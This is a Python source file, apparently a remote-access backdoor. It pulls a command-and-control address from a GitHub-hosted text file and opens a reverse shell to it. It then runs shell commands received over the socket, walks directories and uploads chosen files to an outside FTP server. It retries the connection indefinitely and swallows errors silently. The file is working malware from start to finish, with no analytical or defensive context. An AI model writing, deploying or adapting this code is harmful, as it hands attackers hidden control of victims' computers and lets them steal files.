import subprocess
import socket
import threading
import re
import time
import requests
from ftplib import FTP
import os

pathDi = []
backK = ["hello"]
def dosyayiYukle(ftp, dosyaYolu, uzakDosyaName):
    with open(dosyaYolu, 'rb') as dosya:
        ftp.storbinary(f'STOR {uzakDosyaName}', dosya)

def connect():
    response = requests.get("https://raw.githubusercontent.com/th3j3ss3/project/main/server.txt").text.split("\n")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((response[0], int(response[1])))
    return s

def handle_client(s):
    backD = [True]
    while True:

        if backD[-1]:
            directoryPath = os.getcwd()
            dicStr = directoryPath.encode('CP857')
            s.send(dicStr)
            pathDi.append(directoryPath)
            backD.append(False)

        bufferSize = 1024 * 1024
        command = s.recv(bufferSize)
        commanDec = command.decode('CP857')
        if commanDec != "":
            if commanDec[:10] == ".backPath " and len(command) > 10:
                numberOfReturns = -int(commanDec[10:])

                fragmentedString = pathDi[-1].split("\\")
                if fragmentedString[-1] == '':
                    joined_string = "\\".join(fragmentedString[:numberOfReturns-1])
                    pathDi.append(joined_string)
                    sendSt = (".cdcla " + joined_string).encode('CP857')
                    s.send(sendSt)
                    continue
                else:
                    joined_string = "\\".join(fragmentedString[:numberOfReturns])
                    pathDi.append(joined_string)
                    sendSt = (".cdcla " + joined_string).encode('CP857')
                    s.send(sendSt)
                    continue


            elif commanDec[:3] == ".cd" and len(commanDec) > 4:
                pattern = r'cd\s+(.*?)\s+\.command\s+(.*)'
                match = re.search(pattern, commanDec)
                if match:
                    cD = match.group(1)
                    commanD = match.group(2)
                    print(cD, commanD)
                    cmd = subprocess.Popen(commanD, shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE,
                                               stdin=subprocess.PIPE, cwd=cD)

                    output = cmd.stdout.read() + cmd.stderr.read()
                    s.send(output)
                    continue

            elif commanDec[:12] == ".choosePath " and len(commanDec) > 12:
                pathDi.append(commanDec[12:])
                sendSt = (".cdcla " + commanDec[12:]).encode('CP857')
                s.send(sendSt)
                continue

            elif commanDec[:13] == ".forwardPath " and len(commanDec) > 13:
                forwP = pathDi[-1] + "\\" + commanDec[13:]
                pathDi.append(forwP)
                sendPat = (".cdcla " + forwP).encode('CP857')
                s.send(sendPat)
                continue


            elif commanDec[:4] == ".ftp" and len(commanDec) > 5:
                args = commanDec.split()
                dosyaYoluIndex = args.index('-file') + 1
                dosyaYolu = ' '.join(args[dosyaYoluIndex:])
                dosyaName = os.path.basename(dosyaYolu)
                ftp = FTP(args[args.index('-host') + 1])
                ftp.login(user=args[args.index('-user') + 1], passwd=args[args.index('-pass') + 1])
                dosyayiYukle(ftp, dosyaYolu, dosyaName)
                ftp.quit()
                s.send("[+] Successfully uploaded to ftp address".encode('CP857'))
                continue

            comutfcom = commanDec.replace(".command ", "")
            cmd = subprocess.Popen(comutfcom, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE, cwd=pathDi[-1])

            output = cmd.stdout.read() + cmd.stderr.read()
            if output == b'':
                errO = "No Output".encode('CP857')
                s.send(errO)
                continue
            s.send(output)
    else:
        pass


def main():
    while True:
        try:
            s = connect()
            threading.Thread(target=handle_client, args=(s,)).start()
            break
        except Exception as e:
            time.sleep(10)


while True:
    try:
        main()
        time.sleep(15)
    except:
        pass
